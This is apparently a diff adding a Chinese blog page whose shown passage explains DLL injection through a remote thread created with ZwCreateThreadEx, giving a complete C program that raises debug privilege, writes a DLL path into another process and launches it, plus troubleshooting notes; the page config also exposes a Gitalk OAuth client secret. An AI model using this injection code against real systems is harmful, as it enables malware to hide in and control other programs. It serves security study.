+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">DWORD WINAPI ZwCreateThreadEx(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    LPVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID lpParameter,
+    BOOL CreateSuspended,
+    DWORD dwStackSize,
+    DWORD dw1,
+    DWORD dw2,
+    LPVOID pUnkown
+)
+</code></pre></td></tr></table>
+</div>
+</div><p>实例代码：</p>
+<p><img
+        class="lazyload"
+        data-src="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        data-srcset="https://www.heibai.org/zb_system/image/admin/page_copy.png, https://www.heibai.org/zb_system/image/admin/page_copy.png 1.5x, https://www.heibai.org/zb_system/image/admin/page_copy.png 2x"
+        data-sizes="auto"
+        alt="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        title="点击复制代码"
+    /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">#include &#34;Windows.h&#34;
+#include &lt;stdio.h&gt;
+
+BOOL ZwCreateThreadExInjectDLL(DWORD dwProcessId, const char* pszDllFileName) {
+    HANDLE hProcess = NULL;
+    SIZE_T dwSize = 0;
+    LPVOID pDllAddr = NULL;
+    FARPROC pFuncProcAddr = NULL;
+    HANDLE hRemoteThread = NULL;
+    DWORD dwStatus = 0;
+
+    // 打开进程
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+    if (NULL == hProcess) {
+        printf(&#34;Error OpenProcess:%d&#34;, GetLastError());
+        return FALSE;
+    }
+
+    // 申请内存
+    dwSize = 1 + ::lstrlen(pszDllFileName);
+    pDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
+    if (pDllAddr == NULL){
+        printf(&#34;Error VirtualAllocEx:%d&#34;, GetLastError());
+         return FALSE;
+    }
+
+    // 写入数据
+    if (FALSE == WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL)) {
+        printf(&#34;Error WriteProcessMemory:%d&#34;, GetLastError());
+        return FALSE;
+    }
+
+#ifdef _WIN64
+    typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
+        PHANDLE ThreadHandle,
+        ACCESS_MASK DesiredAccess,
+        LPVOID ObjectAttributes,
+        HANDLE ProcessHandle,
+        LPTHREAD_START_ROUTINE lpStartAddress,
+        LPVOID lpParameter,
+        ULONG CreateThreadFlags,
+        SIZE_T ZeroBits,
+        SIZE_T StackSize,
+        SIZE_T MaximumStackSize,
+        LPVOID pUnkown);
+#else
+    typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
+        PHANDLE ThreadHandle,
+        ACCESS_MASK DesiredAccess,
+        LPVOID ObjectAttributes,
+        HANDLE ProcessHandle,
+        LPTHREAD_START_ROUTINE lpStartAddress,
+        LPVOID lpParameter,
+        BOOL CreateSuspended,
+        DWORD dwStackSize,
+        DWORD dw1,
+        DWORD dw2,
+        LPVOID pUnkown);
+#endif
+
+    // 加载ntdll.dll
+    HMODULE hNtdllDll = LoadLibrary(&#34;ntdll.dll&#34;);
+    if (NULL == hNtdllDll) {
+        printf(&#34;Error Load &#39;ntdll.dll&#39;:%d&#34;, GetLastError());
+        return FALSE;
+    }
+
+    // 获取LoadLibraryA函数地址
+    pFuncProcAddr = GetProcAddress(::GetModuleHandle(&#34;kernel32.dll&#34;), &#34;LoadLibraryA&#34;);
+    if (NULL == pFuncProcAddr) {
+        printf(&#34;Error GetProcAddress &#39;LoadLibraryW&#39;:%d&#34;, GetLastError());
+        return FALSE;
+    }
+
+    // 获取ZwCreateThreadEx函数地址
+    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdllDll, &#34;ZwCreateThreadEx&#34;);
+    if (NULL == ZwCreateThreadEx) {
+        printf(&#34;Error GetProcAddress &#39;ZwCreateThreadEx&#39;:%d&#34;, GetLastError());
+        return FALSE;
+    }
+
+    // 使用ZwCreateThreadEx创建远线程，实现DLL注入
+    dwStatus = ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, 0, 0, 0, NULL);
+    if (NULL == hRemoteThread) {
+        printf(&#34;Error Inject DLL:%u&#34;, dwStatus);
+        return FALSE;
+    }
+    CloseHandle(hProcess);
+    FreeLibrary(hNtdllDll);
+
+    return TRUE;
+}
+
+// OpenProcess打开高权限的进程需要提权
+BOOL EnbalePrivileges(HANDLE hProcess, const char* pszPrivilegesName)
+{
+     HANDLE hToken = NULL;
+     LUID luidValue = { 0 };
+     TOKEN_PRIVILEGES tokenPrivileges = { 0 };
+     BOOL bRet = FALSE;
+     DWORD dwRet = 0;
+     // 打开进程令牌并获取进程令牌句柄
+     bRet = ::OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);
+     if (FALSE == bRet)
+     {
+         printf(&#34;OpenProcessToken&#34;);
+         return FALSE;
+     }
+     // 获取本地系统的 pszPrivilegesName 特权的LUID值
+     bRet = ::LookupPrivilegeValue(NULL, pszPrivilegesName, &amp;luidValue);
+     if (FALSE == bRet){
+         printf(&#34;LookupPrivilegeValue&#34;);
+         return FALSE;
+     }
+     // 设置提升权限信息
+     tokenPrivileges.PrivilegeCount = 1;
+     tokenPrivileges.Privileges[0].Luid = luidValue;
+     tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+     // 提升进程令牌访问权限
+     bRet = ::AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivileges, 0, NULL, NULL);
+     if (FALSE == bRet){
+         printf(&#34;AdjustTokenPrivileges&#34;);
+         return FALSE;
+     }
+     else{
+         // 根据错误码判断是否特权都设置成功
+         dwRet = ::GetLastError();
+         if (ERROR_SUCCESS == dwRet){
+             printf(&#34;SUCCESS!!&#34;);
+             return TRUE;
+         }
+         else if (ERROR_NOT_ALL_ASSIGNED == dwRet){
+             printf(&#34;ERROR_NOT_ALL_ASSIGNED&#34;);
+             return FALSE;
+         }
+     }
+     return FALSE;
+ }
+
+
+int main() {
+    HANDLE hProcess = GetCurrentProcess();
+    EnbalePrivileges(hProcess, SE_DEBUG_NAME);
+
+    const char* dllPath = &#34;E:\\Dll1.dll&#34;;
+    ZwCreateThreadExInjectDLL(2940, dllPath);
+    return 0;
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>执行结果：
+<img
+        class="lazyload"
+        data-src="https://imgs.heibai.org.cn/zb_users/upload/2021/10/20211013110726163409444636953.png"
+        data-srcset="https://imgs.heibai.org.cn/zb_users/upload/2021/10/20211013110726163409444636953.png, https://imgs.heibai.org.cn/zb_users/upload/2021/10/20211013110726163409444636953.png 1.5x, https://imgs.heibai.org.cn/zb_users/upload/2021/10/20211013110726163409444636953.png 2x"
+        data-sizes="auto"
+        alt="https://imgs.heibai.org.cn/zb_users/upload/2021/10/20211013110726163409444636953.png"
+        title="img"
+    /></p>
+<h3 id="0x05-踩坑记录">0x05 踩坑记录</h3>
+<p>1、如果注入到x64程序，最好exe、dll都编译成x64
+2、注入dll需要与注入进程的字符集相同，vs2019可以在项目属性-&gt;高级处选择字符集（被这里坑了好久，普通session层可以注入，session0注入不了，查了好久，最后一个大佬说字符集要相同，后面将dll、exe字符集改成多字符集注入成功了)</p>
+<meting-js url="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/Music/64.mp3" name="" artist="Mr·Yang" cover="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@img/avatar.png" theme="#448aff" fixed="true" autoplay="true" volume="100"></meting-js>
+<img src="https://tool.lu/netcard/"><div class="post-reward">
+  <input type="checkbox" name="reward" id="reward" hidden />
+  <label class="reward-button" for="reward">赞赏支持</label>
+  <div class="qr-code">
+    
+    
+	
+    <label class="qr-code-image" for="reward">
+        
+        <img class="image" src="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/img/weplay.jpg">
+        
+        <span>微信打赏</span>
+      </label>
+    <label class="qr-code-image" for="reward">
+        
+        <img class="image" src="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/img/AliPlay.png">
+        
+        <span>支付宝打赏</span>
+      </label>
+  </div>
+</div>
+
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-01-02&nbsp;<a class="git-hash" href="https://github.com/ybrc/ybrc.github.io/commit/7ebe9aaea52d6821a3aebcf43486a90329d9222c" target="_blank" title="commit by CreatorYBCBrainOut013694(CreatorYBCBrainOut013694@outlook.com) 7ebe9aaea52d6821a3aebcf43486a90329d9222c: 2022/01/02">
+                                    <i class="fas fa-hashtag fa-fw"></i>7ebe9aa</a></span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/zh-cn/31-11/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/zh-cn/tags/dll%E6%B3%A8%E5%85%A5/">DLL注入</a>,&nbsp;<a href="/zh-cn/tags/%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/">远线程注入</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/zh-cn/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/zh-cn/31/" class="prev" rel="prev" title="DLL注入之全局钩子注入"><i class="fas fa-angle-left fa-fw"></i>DLL注入之全局钩子注入</a>
+            <a href="/zh-cn/31-2/" class="next" rel="next" title="ASM实践中的写作C（如果/然后）">ASM实践中的写作C（如果/然后）<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="gitalk" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">欢迎👏来到Mr·Yang的博客</div><div class="footer-line">
+                    <div class="footer-line">
+                        <span id="run-time"></span>
+                    </div>由 <a href="https://ybrc.github.io/" target="_blank" rel="noopener noreffer" title="Mr·Yang 0.91.2">Mr·Yang</a> 强力驱动 | 主题 - <a href="https://ybrc.github.io" target="_blank" rel="noopener noreffer" title="Mr·Yang 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> KissU</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2022</span><span id="busuanzi_container_site_pv">
+                本站访问量：<font color="red"><span id="busuanzi_value_site_pv"></span></font>次
+</span>
+            &nbsp;
+            <span id="busuanzi_container_site_uv">
+                您是本站第：<font color="red"><span id="busuanzi_value_site_uv"></span></font>位访问者
+</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/zh-cn/" target="_blank">Mr·Yang</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/aplayer/APlayer.min.css"><link rel="stylesheet" href="/lib/aplayer/dark.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/aplayer/APlayer.min.js"></script><script type="text/javascript" src="/lib/meting/Meting.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":9},"comment":{"gitalk":{"admin":["ybrc"],"clientID":"f63ed115f939ee05777b","clientSecret":"8932e1a5ea8769617e1767f45deb9cdc256d1beb","id":"2021-11-30T09:43:54+08:00","owner":"ybrc","repo":"ybrc.github.io","title":"技术分享 | DLL注入之远线程注入"}},"data":{"id-1":"[Root@Mr·Yang]#\u003e_","id-2":"[Root@Mr·Yang]#\u003e_"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/zh-cn/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/topbar/topbar.min.js"></script><script type="text/javascript" src="/lib/pjax/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js"></script><div class="pjax-assets"><script type="text/javascript" src="/lib/gitalk/gitalk.min.js"></script><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/gitalk/gitalk.min.css">
+    <noscript><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"></noscript></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script nonce="random123" src='https://cdn.jsdelivr.net/npm/jquery.min.js@3.5.1/jquery.min.js'></script>
+<script nonce="strict-dynamic" src='https://cdn.jsdelivr.net/npm/ismobilejs@1.1.1/dist/isMobile.min.js'></script>
+<script nonce="random123" type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js"></script>
+
+
+<script>
+	 
+	var $cdnPrefix = "https://imgapi.cn/api.php";
+</script><script type="text/javascript" nonce="strict-dynamic" src="/js/custom.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js"></script><div class="GalMenu GalDropDown">
+	      <div class="circle" id="gal">
+	        <div class="ring"><a href="/" 
+			  target="_blank"style="background-image:url(https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/img/tusiji.jpg);"class="menuItem">首页</a><a href="/zh-cn/music-moive/" 
+			  target="_blank"style="background-image:url(https://imgapi.cn/api.php/images/rightmenu/rightmenu2.jpg);"class="menuItem">音乐影视</a><a href="/zh-cn/mryang/" 
+			  target="_blank"style="background-image:url(https://imgapi.cn/api.php/images/rightmenu/rightmenu3.jpg);"class="menuItem">前方高能</a><a href="/zh-cn/ybc/" 
+			  target="_blank"style="background-image:url(https://imgapi.cn/api.php/images/rightmenu/rightmenu4.jpg);"class="menuItem">秘密通道</a><a href="/zh-cn/talk/" 
+			  target="_blank"style="background-image:url(https://imgapi.cn/api.php/images/rightmenu/rightmenu5.jpg);"class="menuItem">即时文献</a><a href="/zh-cn/sources/" 
+			  target="_blank"style="background-image:url(https://imgapi.cn/api.php/images/rightmenu/rightmenu6.jpg);"class="menuItem">装机资源</a></div></div>
+	</div>
+	<script type="text/javascript">
+	var items = document.querySelectorAll('.menuItem'); 
+	for (var i = 0, l = items.length; i < l; i++) {
+        items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+        items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+      }
+	</script>
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/css/GalMenu.css">
+	<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/js/GalMenu.js"></script>
+	<script type="text/javascript">
+    	$(document).ready(function() {
+        $('body').GalMenu({
+          'menu': 'GalDropDown'
+        })
+      });
+	</script><script src="https://cdn.jsdelivr.net/npm/timelinejs-slider@0.1.0/dist/js/timeline.min.js"></script>
+
+<script nonce="strict-dynamic" src="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/js/sakura.js"></script>
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</body>
+</html>
